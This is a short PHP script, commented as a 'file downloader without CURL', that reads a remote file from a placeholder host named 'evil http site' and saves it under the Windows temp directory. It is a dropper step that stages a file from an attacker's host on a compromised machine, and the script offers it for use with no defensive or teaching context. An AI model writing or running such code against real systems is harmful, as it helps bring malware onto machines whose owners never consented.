<?php

// file downloader PHP without CURL

$path = "C:\\windows\\temp\\";
$u = "evil http site";
$nfn = $path . basename($u);
$f = fopen ($u, "rb");
if ($f) {
	$nf = fopen ($nfn, "wb");
	if ($nf){
		while(!feof($f)) {
			fwrite($nf, fread($f, 1024 * 8 ), 1024 * 8 );
		}
		fclose($nf); 
	}
	fclose($f);
}
